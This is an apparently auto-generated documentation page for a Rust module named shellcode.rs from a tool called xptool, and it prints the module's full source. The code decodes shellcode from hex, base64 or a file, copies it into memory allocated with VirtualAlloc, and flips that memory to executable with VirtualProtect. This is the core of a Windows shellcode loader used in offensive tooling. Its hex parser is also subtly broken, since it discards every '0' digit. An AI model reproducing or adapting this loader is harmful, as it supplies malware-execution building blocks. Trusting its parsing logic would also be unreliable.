# shellcode

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/tools/xptool/src/shellcode.rs` |
| **Lines** | 127 |
| **Cards** | T020-crypto |
| **Role** | Shellcode handling |
| **Unsafe blocks** | 2 |

## Types

### enum `ShellcodeSource` (line 9)

### struct `ShellcodeBuffer` (line 59)

## Public API

### `from_hex` (line 17)
```rust
pub fn from_hex(hex_str: &str) -> Result<Vec<u8>>
```

### `from_raw_hex` (line 31)
```rust
pub fn from_raw_hex(hex_str: &str) -> Result<Vec<u8>>
```

### `from_base64` (line 38)
```rust
pub fn from_base64(b64_str: &str) -> Result<Vec<u8>>
```

### `from_file` (line 45)
```rust
pub fn from_file(path: &std::path::Path) -> Result<Vec<u8>>
```

### `resolve` (line 49)
```rust
pub fn resolve(self) -> Result<Vec<u8>>
```

### `new` (line 65)
```rust
pub fn new(shellcode: &[u8]) -> Result<Self>
```

### `ptr` (line 100)
```rust
pub fn ptr(&self) -> *mut c_void
```

### `size` (line 104)
```rust
pub fn size(&self) -> usize
```

### `secure_clear` (line 108)
```rust
pub fn secure_clear(&mut self)
```

## Internal Functions

- `drop` (line 124)

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use windows::Win32::System::Memory::{`
- `use base64::Engine;`

## Full Source

```rust
use anyhow::{anyhow, Result};
use std::ffi::c_void;

use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};

pub enum ShellcodeSource {
    Raw(Vec<u8>),
    Hex(String),
    Base64(String),
    File(std::path::PathBuf),
}

impl ShellcodeSource {
    pub fn from_hex(hex_str: &str) -> Result<Vec<u8>> {
        let cleaned: String = hex_str
            .chars()
            .filter(|c| !c.is_whitespace())
            .filter(|c| *c != ',' && *c != '\\' && *c != 'x' && *c != '0')
            .collect();

        if cleaned.is_empty() {
            return Err(anyhow!("Hex string vacia"));
        }

        hex::decode(&cleaned).map_err(|e| anyhow!("Hex decode error: {}", e))
    }

    pub fn from_raw_hex(hex_str: &str) -> Result<Vec<u8>> {
        let hex_str = hex_str.trim();
        let hex_str = hex_str.strip_prefix("0x").unwrap_or(hex_str);

        hex::decode(hex_str).map_err(|e| anyhow!("Hex decode error: {}", e))
    }

    pub fn from_base64(b64_str: &str) -> Result<Vec<u8>> {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD
            .decode(b64_str.trim())
            .map_err(|e| anyhow!("Base64 decode error: {}", e))
    }

    pub fn from_file(path: &std::path::Path) -> Result<Vec<u8>> {
        std::fs::read(path).map_err(|e| anyhow!("File read error: {}", e))
    }

    pub fn resolve(self) -> Result<Vec<u8>> {
        match self {
            ShellcodeSource::Raw(data) => Ok(data),
            ShellcodeSource::Hex(hex_str) => Self::from_hex(&hex_str),
            ShellcodeSource::Base64(b64_str) => Self::from_base64(&b64_str),
            ShellcodeSource::File(path) => Self::from_file(&path),
        }
    }
}

pub struct ShellcodeBuffer {
    ptr: *mut c_void,
    size: usize,
}

impl ShellcodeBuffer {
    pub fn new(shellcode: &[u8]) -> Result<Self> {
        if shellcode.is_empty() {
            return Err(anyhow!("Shellcode vacio"));
        }

        unsafe {
            let ptr = VirtualAlloc(
                None,
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if ptr.is_null() {
                return Err(anyhow!("VirtualAlloc fallo"));
            }

            std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());

            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(
                ptr,
                shellcode.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            )
            .map_err(|e| anyhow!("VirtualProtect fallo: {:?}", e))?;

            Ok(Self {
                ptr,
                size: shellcode.len(),
            })
        }
    }

    pub fn ptr(&self) -> *mut c_void {
        self.ptr
    }

    pub fn size(&self) -> usize {
        self.size
    }

    pub fn secure_clear(&mut self) {
        unsafe {
            if !self.ptr.is_null() {
                let buf = std::slice::from_raw_parts_mut(self.ptr as *mut u8, self.size);
                for b in buf.iter_mut() {
                    std::ptr::write_volatile(b, 0);
                }
                VirtualFree(self.ptr, 0, MEM_RELEASE).ok();
                self.ptr = std::ptr::null_mut();
                self.size = 0;
            }
        }
    }
}

impl Drop for ShellcodeBuffer {
    fn drop(&mut self) {
        self.secure_clear();
    }
}

```